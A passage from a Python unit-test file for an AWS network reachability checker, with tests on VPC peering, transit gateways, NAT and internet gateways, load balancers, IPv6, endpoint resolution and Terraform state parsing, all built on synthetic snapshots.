        snap.get(host).props["private_ip"] = "10.0.200.10"
        snap.get("subnet-vpc-b").props["cidr"] = "10.0.200.0/24"
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("the VPCs overlap", hop(r, "route").reason)

    def test_transit_gateway_is_unknown_with_the_caveat(self):
        snap = base()
        host = second_vpc(snap)
        mm.add_tgw(snap, "tgw-1", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-a", "tgw-1", "vpc-a", ["subnet-app"])
        mm.add_tgw_attachment(snap, "tgw-attach-b", "tgw-1", "vpc-b", ["subnet-vpc-b"])
        mm.add_route(snap, "rtb-priv", "10.1.0.0/16", "tgw-1")
        mm.add_route(snap, "rtb-vpc-b", "10.0.0.0/8", "tgw-1")
        snap = done(snap)
        r = reach.check(snap, "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        h = hop(r, "tgw")
        self.assertEqual(h.status, "unknown")
        self.assertIn("route tables aren't in the snapshot", h.reason)
        self.assertTrue(any("Transit gateway route tables aren't in the snapshot" in n for n in r.notes))
        self.assertIn("Everything else on the way allows it", r.summary)
        self.assertEqual(hop(r, "route-back").status, "ok")
        for nid in ("tgw-1", "tgw-attach-a", "tgw-attach-b"):
            self.assertIn(nid, r.path_nodes)
        self.assertEqual(r.exit_code, 4)

    def test_replies_back_another_way(self):
        # There through a peering connection, back through a transit gateway: that can
        # work (security groups track connections on each host), so it's unknown.
        snap, host = self.peered(both=False)
        mm.add_tgw(snap, "tgw-1", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-a", "tgw-1", "vpc-a")
        mm.add_tgw_attachment(snap, "tgw-attach-b", "tgw-1", "vpc-b")
        mm.add_route(snap, "rtb-vpc-b", "10.0.0.0/16", "tgw-1")
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertEqual(hop(r, "route-back").status, "unknown")
        self.assertIn("isn't the way the traffic came", hop(r, "route-back").reason)
        # There through a transit gateway, back through a peering connection that joins
        # the two VPCs: the replies get back.
        snap = base()
        host = second_vpc(snap)
        mm.add_peering(snap, "pcx-1", "vpc-a", "vpc-b", "active")
        mm.add_route(snap, "rtb-vpc-b", "10.0.0.0/16", "pcx-1")
        mm.add_tgw(snap, "tgw-1", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-a", "tgw-1", "vpc-a")
        mm.add_tgw_attachment(snap, "tgw-attach-b", "tgw-1", "vpc-b")
        mm.add_route(snap, "rtb-priv", "10.1.0.0/16", "tgw-1")
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "unknown")                 # the transit gateway itself
        self.assertEqual(hop(r, "route-back").status, "ok")
        self.assertIn("joins the two VPCs", hop(r, "route-back").reason)

    def test_group_reference_with_an_unknown_route_is_unknown(self):
        snap, host = self.peered()
        set_rules(snap, "sg-vpc-b", "ingress", [mm.rule("tcp", 5432, 5432, groups=["sg-app"])])
        snap = done(snap)
        snap.get("subnet-app").props["route_table"] = ""
        snap.nodes.pop("rtb-priv")
        r = reach.check(snap, "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertEqual(hop(r, "sg-in").status, "unknown")
        self.assertNotIn("between regions", hop(r, "sg-in").reason)

    def test_transit_gateway_without_a_route_back(self):
        snap = base()
        host = second_vpc(snap)
        mm.add_tgw(snap, "tgw-1", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-a", "tgw-1", "vpc-a")
        mm.add_tgw_attachment(snap, "tgw-attach-b", "tgw-1", "vpc-b")
        mm.add_route(snap, "rtb-priv", "10.1.0.0/16", "tgw-1")
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "route-back")

    def test_transit_gateway_the_other_vpc_isnt_attached_to(self):
        snap = base()
        host = second_vpc(snap)
        mm.add_tgw(snap, "tgw-1", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-a", "tgw-1", "vpc-a")
        mm.add_route(snap, "rtb-priv", "10.1.0.0/16", "tgw-1")
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "tgw")
        self.assertIn("has no attachment", r.blocked_hop.reason)
        # Attached to another transit gateway: the two may be peered (not in the snapshot).
        mm.add_tgw(snap, "tgw-2", ACCT, "us-east-1")
        mm.add_tgw_attachment(snap, "tgw-attach-b", "tgw-2", "vpc-b")
        mm.add_route(snap, "rtb-vpc-b", "10.0.0.0/16", "tgw-2")
        r = reach.check(done(snap), "app", host, "tcp", 5432)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertIn("Whether the two are peered", hop(r, "tgw").reason)


# =================================================================== the internet

class InternetTests(unittest.TestCase):
    def test_out_through_the_internet_gateway_with_a_public_ip(self):
        r = reach.check(done(base()), "web", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(kinds(r), ["sg-out", "nacl-out", "route", "public-ip", "nacl-back-in"])
        self.assertIn("internet gateway igw-a", hop(r, "route").reason)
        self.assertIn("public IP 54.0.0.10", hop(r, "public-ip").reason)
        self.assertIn("igw-a", r.path_nodes)
        self.assertIn("route:subnet-pub->igw-a", r.path_edges)
        self.assertIn("can reach the internet on tcp 443", r.summary)

    def test_out_through_the_internet_gateway_without_a_public_ip(self):
        snap = base()
        mm.add_instance(snap, "i-nopub", "subnet-pub", "vpc-a", "nopub", private_ip="10.0.1.20",
                        security_groups=["sg-web"])
        r = reach.check(done(snap), "nopub", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        self.assertIn("has no public IP", r.blocked_hop.reason)

    def test_out_through_a_nat_gateway(self):
        r = reach.check(done(base()), "app", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(kinds(r), ["sg-out", "nacl-out", "route", "nat-nacl-in", "nat",
                                    "nat-route", "nat-nacl-out", "nat-nacl-back-in",
                                    "nat-nacl-back-out", "nacl-back-in"])
        for nid in ("nat-a", "subnet-pub", "rtb-pub", "igw-a"):
            self.assertIn(nid, r.path_nodes)
        self.assertIn("route:subnet-app->nat-a", r.path_edges)
        self.assertIn("route:subnet-pub->igw-a", r.path_edges)

    def test_nat_gateway_in_a_subnet_without_an_internet_route(self):
        snap = base()
        mm.add_subnet(snap, "subnet-natpriv", "vpc-a", "us-east-1a", "10.0.20.0/24", "natpriv")
        snap.get("acl-default").props["subnets"].append("subnet-natpriv")
        mm.associate_subnet(snap, "rtb-priv", "subnet-natpriv")
        snap.nodes.pop("nat-a")
        mm.add_nat(snap, "nat-a", "subnet-natpriv", "vpc-a", public_ip="54.0.0.1", state="available")
        r = reach.check(done(snap), "app", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "nat-route")
        self.assertIn("A NAT gateway can't send through another NAT gateway", r.blocked_hop.reason)

    def test_nat_subnet_acl_drops_part_of_the_replies(self):
        snap = base()
        own_acl(snap, "acl-pub", "subnet-pub", [
            mm.nacl_entry(100, False, "allow", "tcp", "10.0.0.0/16", "", 0, 65535),
            mm.nacl_entry(110, False, "allow", "tcp", "0.0.0.0/0", "", 32768, 65535),
            mm.nacl_entry(100, True, "allow", "-1", "0.0.0.0/0")] + mm.default_nacl_entries())
        r = reach.check(done(snap), "app", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "blocked", reach.result_text(r))
        h = hop(r, "nat-nacl-back-in")
        self.assertTrue(h.partial)
        self.assertIn("A NAT gateway uses ports 1024-65535", h.reason)

    def test_blackhole_route(self):
        snap = base()
        snap.get("rtb-priv").props["routes"] = [{"dest": "10.0.0.0/16", "target": "local"}]
        mm.add_route_table(snap, "rtb-priv", "vpc-a", blackholes=[{"dest": "0.0.0.0/0",
                                                                   "target": "nat-gone"}])
        r = reach.check(done(snap), "app", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("blackhole", r.blocked_hop.reason)

    def test_in_from_the_internet_to_a_private_instance(self):
        snap = base()
        set_rules(snap, "sg-app", "ingress", [mm.rule("tcp", 8080, 8080, ["0.0.0.0/0"])])
        r = reach.check(done(snap), "internet", "app", "tcp", 8080)
        self.assertEqual(r.verdict, "blocked")
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        self.assertIn("app has no public IP address", r.blocked_hop.reason)
        back = hop(r, "route-back")
        self.assertEqual(back.status, "blocked")
        self.assertIn("NAT gateway", back.reason)

    def test_public_ip_in_a_private_subnet_breaks_the_replies(self):
        snap = base()
        snap.get("i-app").props["public_ip"] = "54.0.0.11"
        set_rules(snap, "sg-app", "ingress", [mm.rule("tcp", 8080, 8080, ["0.0.0.0/0"])])
        r = reach.check(done(snap), "internet", "app", "tcp", 8080)
        self.assertEqual(r.blocked_hop.kind, "route-back")
        self.assertIn("Replies leave through the NAT gateway", r.blocked_hop.reason)

    def test_in_from_the_internet_to_a_public_instance(self):
        r = reach.check(done(base()), "internet", "web", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertEqual(kinds(r), ["public-ip", "igw", "nacl-in", "sg-in", "nacl-back-out",
                                    "route-back"])
        r = reach.check(done(base()), "internet", "web", "tcp", 22)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("0.0.0.0/0", r.blocked_hop.fix)

    def test_return_acl_in_from_the_internet(self):
        snap = base()
        own_acl(snap, "acl-pub", "subnet-pub", [
            mm.nacl_entry(100, False, "allow", "-1", "0.0.0.0/0"),
            mm.nacl_entry(100, True, "allow", "tcp", "10.0.0.0/16", "", 0, 65535)] +
            mm.default_nacl_entries())
        r = reach.check(done(snap), "internet", "web", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "nacl-back-out")

    def test_vpc_without_an_internet_gateway(self):
        snap = base()
        snap.nodes.pop("igw-a")
        r = reach.check(done(snap), "internet", "web", "tcp", 443)
        self.assertEqual(hop(r, "igw").status, "blocked")

    def test_internet_facing_load_balancer(self):
        snap = base()
        mm.add_subnet(snap, "subnet-pub2", "vpc-a", "us-east-1b", "10.0.2.0/24", "public-b")
        snap.get("acl-default").props["subnets"].append("subnet-pub2")
        mm.associate_subnet(snap, "rtb-pub", "subnet-pub2")
        mm.add_lb(snap, LB, "web", "vpc-a", ["subnet-pub", "subnet-pub2"], scheme="internet-facing",
                  security_groups=["sg-web"], listeners=[{"port": 443, "protocol": "HTTPS"}])
        snap.get("i-web").name = "web-host"
        snap = done(snap)
        r = reach.check(snap, "internet", LB, "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertIn("internet-facing", hop(r, "public-ip").reason)
        self.assertIn("has a listener on tcp 443 (HTTPS)", hop(r, "service").reason)
        self.assertTrue(any("separate check" in n for n in r.notes))
        r = reach.check(snap, "internet", "web", "tcp", 8443)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("no listener on tcp 8443. Its listeners: 443 (HTTPS)", hop(r, "service").reason)
        # The load balancer to its targets.
        r = reach.check(snap, "web", "app", "tcp", 8080)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))

    def test_load_balancer_reachable_through_only_some_subnets(self):
        snap = base()
        mm.add_subnet(snap, "subnet-pub2", "vpc-a", "us-east-1b", "10.0.2.0/24", "public-b")
        mm.associate_subnet(snap, "rtb-pub", "subnet-pub2")
        mm.add_nacl(snap, "acl-pub2", "vpc-a", ["subnet-pub2"], entries=mm.default_nacl_entries())
        mm.add_lb(snap, LB, "lb", "vpc-a", ["subnet-pub", "subnet-pub2"], scheme="internet-facing",
                  security_groups=["sg-web"])
        r = reach.check(done(snap), "internet", "lb", "tcp", 443)
        self.assertEqual(r.verdict, "blocked")
        self.assertTrue(r.partial)
        self.assertIn("through only some of the subnets", r.summary)

    def test_internal_load_balancer(self):
        snap = base()
        mm.add_lb(snap, LB, "lb", "vpc-a", ["subnet-app"], scheme="internal",
                  security_groups=["sg-web"])
        r = reach.check(done(snap), "internet", "lb", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        self.assertIn("internal load balancer", r.blocked_hop.reason)

    def test_network_load_balancer_without_security_groups(self):
        snap = base()
        mm.add_lb(snap, LB, "nlb", "vpc-a", ["subnet-pub"], scheme="internet-facing",
                  lb_type="network", security_groups=[])
        r = reach.check(done(snap), "internet", "nlb", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertIn("doesn't filter traffic itself", hop(r, "sg-in").reason)

    def test_publicly_accessible_database(self):
        snap = base()
        snap.get(DB).props["public"] = True
        set_rules(snap, "sg-db", "ingress", [mm.rule("tcp", 5432, 5432, ["0.0.0.0/0"])])
        r = reach.check(done(snap), "internet", "db1", "tcp", 5432)
        self.assertEqual(hop(r, "public-ip").status, "ok")
        self.assertEqual(r.blocked_hop.kind, "route-back")      # but its subnet is private

    def test_ipv6_out_through_an_egress_only_gateway(self):
        snap = base()
        snap.get("subnet-app").props["ipv6_cidr"] = "2600:1f18:aaaa:11::/64"
        snap.get("i-app").props["ipv6_ips"] = ["2600:1f18:aaaa:11::10"]
        mm.add_gateway(snap, "eigw", "eigw-a", "vpc-a")
        mm.add_route(snap, "rtb-priv", "::/0", "eigw-a")
        snap.get("sg-app").props["egress"].append(mm.rule("-1", None, None, ["::/0"]))
        snap.get("acl-default").props["entries"] += [
            mm.nacl_entry(101, eg, "allow", "-1", "", "::/0") for eg in (False, True)]
        snap = done(snap)
        r = reach.check(snap, "app", "internet-ipv6", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertIn("egress-only internet gateway eigw-a", hop(r, "route").reason)
        self.assertIn("2600:1f18:aaaa:11::10", hop(r, "public-ip").reason)
        r = reach.check(snap, "app", "2001:db8::1", "tcp", 443)
        self.assertEqual(r.verdict, "reachable")
        # Connections from the internet don't come in through an egress-only gateway.
        set_rules(snap, "sg-app", "ingress", [mm.rule("tcp", 443, 443, ["::/0"])])
        r = reach.check(snap, "internet-ipv6", "app", "tcp", 443)
        self.assertNotEqual(r.verdict, "reachable")
        # A host without IPv6.
        r = reach.check(snap, "web", "internet-ipv6", "tcp", 443)
        self.assertEqual(r.verdict, "blocked")
        self.assertIn("no IPv6 address", r.summary)

    def test_ipv4_rules_dont_cover_ipv6(self):
        snap = base()
        snap.get("subnet-pub").props["ipv6_cidr"] = "2600:1f18:aaaa:1::/64"
        snap.get("i-web").props["ipv6_ips"] = ["2600:1f18:aaaa:1::10"]
        mm.add_route(snap, "rtb-pub", "::/0", "igw-a")
        r = reach.check(done(snap), "web", "internet-ipv6", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "sg-out")       # egress is 0.0.0.0/0 only

    def test_more_specific_routes_take_part_of_the_internet(self):
        snap = base()
        mm.add_route_table(snap, "rtb-pub", "vpc-a", blackholes=[
            {"dest": "0.0.0.0/1", "target": "eni-gone"}, {"dest": "128.0.0.0/1", "target": "eni-gone"}])
        r = reach.check(done(snap), "web", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertIn("Parts of the internet take different routes", hop(r, "route").reason)
        # Routes to other networks (a peered VPC, on-premises) aren't the internet.
        snap = base()
        mm.add_route(snap, "rtb-pub", "198.51.100.0/24", "vgw-a")
        r = reach.check(done(snap), "web", "internet", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))

    def test_nat_gateway_on_to_a_peering_is_unknown(self):
        snap = base()
        mm.add_peering(snap, "pcx-x", "vpc-a", "vpc-z", "active",
                       accepter={"account": "444455556666", "region": "us-east-1",
                                 "cidr": "10.50.0.0/16"})
        mm.add_route(snap, "rtb-pub", "172.16.0.0/16", "pcx-x")
        r = reach.check(done(snap), "app", "172.16.1.1", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertEqual(hop(r, "nat-route").status, "unknown")

    def test_peering_to_a_vpc_outside_the_snapshot(self):
        # A peered VPC known only from the peering has only its main range recorded, so an
        # address beyond it may still be its own (a second CIDR).
        snap = base()
        mm.add_peering(snap, "pcx-x", "vpc-a", "vpc-z", "active",
                       accepter={"account": "444455556666", "region": "us-east-1",
                                 "cidr": "10.50.0.0/16"})
        mm.add_route(snap, "rtb-priv", "100.70.0.0/16", "pcx-x")
        r = reach.check(done(snap), "app", "100.70.1.1", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))
        self.assertIn("isn't fully in the snapshot", hop(r, "route").reason)
        # A scanned VPC's ranges are all known: beyond them, a peering goes nowhere.
        snap = base()
        second_vpc(snap)
        mm.add_peering(snap, "pcx-1", "vpc-a", "vpc-b", "active")
        mm.add_route(snap, "rtb-priv", "100.70.0.0/16", "pcx-1")
        r = reach.check(done(snap), "app", "100.70.1.1", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "route")
        self.assertIn("only reaches the other VPC's own addresses", r.blocked_hop.reason)

    def ipv6_vpc(self):
        snap = base()
        snap.get("subnet-pub").props["ipv6_cidr"] = "2600:1f18:aaaa:1::/64"
        mm.add_route(snap, "rtb-pub", "::/0", "igw-a")
        snap.get("sg-web").props["egress"].append(mm.rule("-1", None, None, ["::/0"]))
        snap.get("sg-web").props["ingress"].append(mm.rule("tcp", 443, 443, ["::/0"]))
        snap.get("acl-default").props["entries"] += [
            mm.nacl_entry(101, eg, "allow", "-1", "", "::/0") for eg in (False, True)]
        return snap

    def test_ipv6_needs_an_address_of_its_own(self):
        snap = self.ipv6_vpc()
        s = done(snap)
        for src, dst in (("web", "internet-ipv6"), ("internet-ipv6", "web")):
            r = reach.check(s, src, dst, "tcp", 443)
            self.assertEqual(r.verdict, "unknown", reach.result_text(r))
            self.assertIn("No IPv6 address is recorded for web", hop(r, "address").reason)
        snap.get("i-web").props["ipv6_ips"] = ["2600:1f18:aaaa:1::10"]
        r = reach.check(done(snap), "internet-ipv6", "web", "tcp", 443)
        self.assertEqual(r.verdict, "reachable", reach.result_text(r))
        self.assertNotIn("address", kinds(r))

    def test_ipv6_internal_load_balancer_and_private_database(self):
        snap = self.ipv6_vpc()
        mm.add_lb(snap, LB, "lb", "vpc-a", ["subnet-pub"], scheme="internal",
                  security_groups=["sg-web"], listeners=[{"port": 443, "protocol": "HTTPS"}])
        mm.add_rds(snap, DB + "-pub", "db2", "vpc-a", ["subnet-pub"], "us-east-1a", "postgres",
                   security_groups=["sg-web"])
        set_rules(snap, "sg-web", "ingress", [mm.rule("-1", None, None, ["::/0"])])
        snap = done(snap)
        r = reach.check(snap, "internet-ipv6", "lb", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        self.assertIn("internal load balancer", r.blocked_hop.reason)
        r = reach.check(snap, "internet-ipv6", "db2", "tcp", 5432)
        self.assertEqual(r.blocked_hop.kind, "public-ip")
        snap.get(LB).props["scheme"] = "internet-facing"
        r = reach.check(snap, "internet-ipv6", "lb", "tcp", 443)
        self.assertEqual(r.verdict, "unknown", reach.result_text(r))    # dual-stack isn't known
        self.assertIn("dual-stack", hop(r, "address").reason)

    def test_public_ip_from_inside_aws_asks_for_two_checks(self):
        snap = base()
        set_rules(snap, "sg-web", "ingress", [mm.rule("tcp", 443, 443, groups=["sg-app"])])
        snap = done(snap)
        with self.assertRaisesRegex(reach.ReachError, "public IP of web"):
            reach.check(snap, "app", "54.0.0.10", "tcp", 443)
        r = reach.check(snap, "internet", "54.0.0.10", "tcp", 443)
        self.assertEqual(r.blocked_hop.kind, "sg-in")         # only app's group is allowed
        r = reach.check(snap, "app", "10.0.1.10", "tcp", 443)
        self.assertEqual(r.verdict, "reachable")

    def test_load_balancers_dont_answer_ping(self):
        snap = base()
        mm.add_lb(snap, LB, "lb", "vpc-a", ["subnet-pub"], scheme="internet-facing",
                  security_groups=["sg-web"])
        set_rules(snap, "sg-web", "ingress", [mm.rule("-1", None, None, ["0.0.0.0/0"])])
        r = reach.check(done(snap), "internet", "lb", "icmp", None)
        self.assertEqual(r.blocked_hop.kind, "service")
        self.assertIn("don't answer ping", r.blocked_hop.reason)

    def test_on_premises_over_a_vpn_is_unknown(self):
        snap = base()
        mm.add_gateway(snap, "vgw", "vgw-a", "vpc-a")
        mm.add_route(snap, "rtb-priv", "192.168.0.0/16", "vgw-a")
        set_rules(snap, "sg-app", "ingress", [mm.rule("tcp", 8080, 8080, ["192.168.0.0/16"])])
        snap = done(snap)
        r = reach.check(snap, "app", "192.168.1.5", "tcp", 443)
        self.assertEqual(r.destination.kind, "outside")
        self.assertEqual(r.verdict, "unknown")
        self.assertIn("VPN or Direct Connect", hop(r, "route").reason)
        r = reach.check(snap, "192.168.1.5", "app", "tcp", 8080)
        self.assertEqual(r.verdict, "unknown")
        self.assertNotIn("public-ip", kinds(r))


# =================================================================== picking things

class EndpointTests(unittest.TestCase):
    def setUp(self):
        self.snap = done(base())

    def test_endpoints(self):
        eps = reach.endpoints(self.snap)
        keys = [e.key for e in eps]
        self.assertEqual(keys[-2:], ["internet", "internet-ipv6"])
        self.assertEqual([e.kind for e in eps[:3]], ["instance"] * 3)
        for key in ("i-web", "i-app", DB, "subnet-db"):
            self.assertIn(key, keys)
        web = next(e for e in eps if e.key == "i-web")
        self.assertEqual(web.label, "web (10.0.1.10, in public)")
        self.assertEqual(web.security_groups, ["sg-web"])
        db = next(e for e in eps if e.key == DB)
        self.assertEqual(db.ports, [(5432, "TCP")])       # postgres' default port

    def test_resolve(self):
        snap = self.snap
        self.assertEqual(reach.resolve(snap, "i-app").kind, "instance")
        self.assertEqual(reach.resolve(snap, "app").node_id, "i-app")
        self.assertEqual(reach.resolve(snap, "10.0.11.10").node_id, "i-app")
        pub = reach.resolve(snap, "54.0.0.10")
        self.assertEqual(pub.node_id, "i-web")
        self.assertIn("public IP of web", pub.notes[0])
        self.assertEqual(reach.resolve(snap, "data").kind, "subnet")
        self.assertEqual(reach.resolve(snap, "db1").node_id, DB)
        addr = reach.resolve(snap, "10.0.12.99")
        self.assertEqual((addr.kind, addr.subnets), ("address", ["subnet-db"]))
        rng = reach.resolve(snap, "10.0.0.0/20")
        self.assertEqual((rng.kind, sorted(rng.subnets)),
                         ("cidr", ["subnet-app", "subnet-db", "subnet-pub"]))
        self.assertEqual(reach.resolve(snap, "8.8.8.8").kind, "internet")
        self.assertEqual(reach.resolve(snap, "172.16.5.5").kind, "outside")
        self.assertEqual(reach.resolve(snap, "0.0.0.0/0").key, "internet")
        self.assertEqual(reach.resolve(snap, "::/0").key, "internet-ipv6")
        self.assertEqual(reach.resolve(snap, "INTERNET").key, "internet")

    def test_bad_input(self):
        snap = self.snap
        with self.assertRaisesRegex(reach.ReachError, "Couldn't find nope"):
            reach.resolve(snap, "nope")
        with self.assertRaisesRegex(reach.ReachError, "Pick an instance"):
            reach.resolve(snap, "vpc-a")
        with self.assertRaisesRegex(reach.ReachError, "not in any subnet"):
            reach.resolve(snap, "10.0.200.1")
        with self.assertRaisesRegex(reach.ReachError, "covers part of vpc-a"):
            reach.resolve(snap, "10.0.0.0/8")
        with self.assertRaisesRegex(reach.ReachError, "Both sides are outside AWS"):
            reach.check(snap, "internet", "8.8.8.8")
        with self.assertRaisesRegex(reach.ReachError, "both the source and the destination"):
            reach.check(snap, "app", "i-app")
        with self.assertRaisesRegex(reach.ReachError, "tcp, udp, icmp or all"):
            reach.check(snap, "app", "db1", "sctp", 1)
        with self.assertRaisesRegex(reach.ReachError, "between 0 and 65535"):
            reach.check(snap, "app", "db1", "tcp", 70000)
        with self.assertRaisesRegex(reach.ReachError, "IPv4 and the other IPv6"):
            reach.check(snap, "10.0.11.10", "2001:db8::1")

    def test_ambiguous_names(self):
        snap = base()
        mm.add_instance(snap, "i-dup", "subnet-app", "vpc-a", "app", private_ip="10.0.11.12")
        snap = done(snap)
        with self.assertRaisesRegex(reach.ReachError, "matches 3 things"):
            reach.resolve(snap, "app")
        # One instance and a subnet with the same name: the instance, with a note.
        ep = reach.resolve(done(base()), "app")
        self.assertEqual(ep.node_id, "i-app")
        self.assertIn("also the name of subnet subnet-app", ep.notes[0])

    def test_result_text_and_colors(self):
        r = reach.check(self.snap, "web", "db1", "tcp", 5432)
        text = reach.result_text(r)
        self.assertTrue(text.startswith("From  web (10.0.1.10, in public)\nTo    db1"))
        self.assertIn("Over  tcp 5432", text)
        self.assertIn("On the way there", text)
        self.assertIn("Replies", text)
        self.assertIn("To allow it: aws ec2", text)
        painted = reach.result_text(r, lambda t, w: f"<{w}>{t}</{w}>")
        self.assertIn("<blocked>Blocked</blocked>", painted)
        self.assertIn("<ok>ok", painted)
        for line in text.splitlines():
            self.assertNotIn("\u2014", line)
            self.assertNotIn("\u2013", line)


# =================================================================== inputs

class SnapshotDataTests(unittest.TestCase):
    def test_entries_are_sorted_and_snapshots_stay_byte_stable(self):
        snap = base()
        mm.add_nacl(snap, "acl-x", "vpc-a", [], entries=[
            mm.nacl_entry(200, True, "allow", "udp", "0.0.0.0/0", "", 53, 53),
            mm.nacl_entry(100, False, "deny", "tcp", "0.0.0.0/0", "", "22", "22"),
            mm.nacl_entry(50, False, "allow", "icmp", "10.0.0.0/8", icmp_type=8, icmp_code=-1)])
        snap = done(snap)
        entries = snap.get("acl-x").props["entries"]
        self.assertEqual([(e["egress"], e["rule"]) for e in entries],
                         [(False, 50), (False, 100), (True, 200)])
        self.assertEqual(entries[1], {"rule": 100, "egress": False, "action": "deny",
                                      "protocol": "6", "cidr": "0.0.0.0/0", "ipv6_cidr": "",
                                      "from": 22, "to": 22})
        self.assertEqual((entries[0]["icmp_type"], entries[0]["icmp_code"]), (8, -1))
        path = Path(TMP) / "stable.cloudmap.json"
        snap.save(path)
        self.assertEqual(mm.Snapshot.load(path).dumps(), snap.dumps())
        self.assertEqual(mm.protocol_number("TCP"), "6")
        self.assertEqual(mm.protocol_number("all"), "-1")
        self.assertEqual(mm.protocol_number(-1), "-1")

    def test_new_props_only_appear_when_known(self):
        self.assertNotIn("prefix_lists", mm.rule("tcp", 1, 1, ["0.0.0.0/0"]))
        snap = mm.Snapshot()
        mm.add_vpc(snap, "vpc-1", ACCT, "us-east-1", ["10.0.0.0/16"])
        lb = mm.add_lb(snap, LB, "x", "vpc-1")
        self.assertNotIn("security_groups", lb.props)
        self.assertNotIn("listeners", lb.props)
        rt = mm.add_route_table(snap, "rtb-1", "vpc-1")
        self.assertNotIn("blackholes", rt.props)
        nacl = mm.add_nacl(snap, "acl-1", "vpc-1")
        self.assertNotIn("entries", nacl.props)
        db = mm.add_rds(snap, DB, "db", "vpc-1", engine="")
        self.assertNotIn("port", db.props)
        self.assertEqual(mm.add_rds(snap, DB + "2", "db2", "vpc-1", engine="aurora-mysql").props["port"], 3306)


class TerraformTests(unittest.TestCase):
    def state(self):
        def res(addr, values):
            rtype, name = addr.split(".")[:2]
            return {"address": addr, "mode": "managed", "type": rtype, "name": name.split("[")[0],
                    "values": values}
        arn = f"arn:aws:ec2:us-east-1:{ACCT}"
        return {"format_version": "1.0", "terraform_version": "1.9.8", "values": {"root_module": {"resources": [
            res("aws_vpc.main", {"id": "vpc-1", "arn": f"{arn}:vpc/vpc-1", "cidr_block": "10.0.0.0/16",
                                 "default_network_acl_id": "acl-dflt", "tags": {"Name": "main"}}),
            res("aws_vpc.other", {"id": "vpc-2", "arn": f"{arn}:vpc/vpc-2", "cidr_block": "10.9.0.0/16",
                                  "default_network_acl_id": "acl-dflt2"}),
            res("aws_subnet.app", {"id": "subnet-app", "arn": f"{arn}:subnet/subnet-app", "vpc_id": "vpc-1",
                                   "cidr_block": "10.0.11.0/24", "availability_zone": "us-east-1a",
                                   "tags": {"Name": "app"}}),
            res("aws_subnet.db", {"id": "subnet-db", "arn": f"{arn}:subnet/subnet-db", "vpc_id": "vpc-1",
                                  "cidr_block": "10.0.12.0/24", "availability_zone": "us-east-1b",
                                  "tags": {"Name": "db"}}),
            res("aws_subnet.other", {"id": "subnet-o", "arn": f"{arn}:subnet/subnet-o", "vpc_id": "vpc-2",
                                     "cidr_block": "10.9.1.0/24", "availability_zone": "us-east-1a"}),
            res("aws_network_acl.db", {"id": "acl-db", "vpc_id": "vpc-1", "subnet_ids": [], "tags": {"Name": "db-acl"},
                                       "ingress": [
                                           {"rule_no": 100, "action": "allow", "protocol": "-1",
                                            "cidr_block": "0.0.0.0/0", "ipv6_cidr_block": "",
                                            "from_port": 0, "to_port": 0, "icmp_type": 0, "icmp_code": 0},
                                           {"rule_no": 90, "action": "deny", "protocol": "6",
                                            "cidr_block": "10.0.11.0/24", "ipv6_cidr_block": "",
                                            "from_port": 5432, "to_port": 5432, "icmp_type": 0, "icmp_code": 0}],
                                       "egress": [
                                           {"rule_no": 100, "action": "allow", "protocol": "tcp",
                                            "cidr_block": "0.0.0.0/0", "ipv6_cidr_block": "",
                                            "from_port": 1024, "to_port": 65535, "icmp_type": 0, "icmp_code": 0}]}),
            # The same rule as the inline rule 90 (Terraform lists both), and one more.
            res("aws_network_acl_rule.deny_pg", {"id": "nacl-123", "network_acl_id": "acl-db", "rule_number": 90,
                                                 "egress": False, "protocol": "6", "rule_action": "deny",
                                                 "cidr_block": "10.0.11.0/24", "from_port": 5432, "to_port": 5432}),
            res("aws_network_acl_rule.icmp", {"id": "nacl-456", "network_acl_id": "acl-db", "rule_number": 120,
                                              "egress": True, "protocol": "icmp", "rule_action": "allow",
                                              "cidr_block": "10.0.0.0/16", "icmp_type": 0, "icmp_code": -1}),
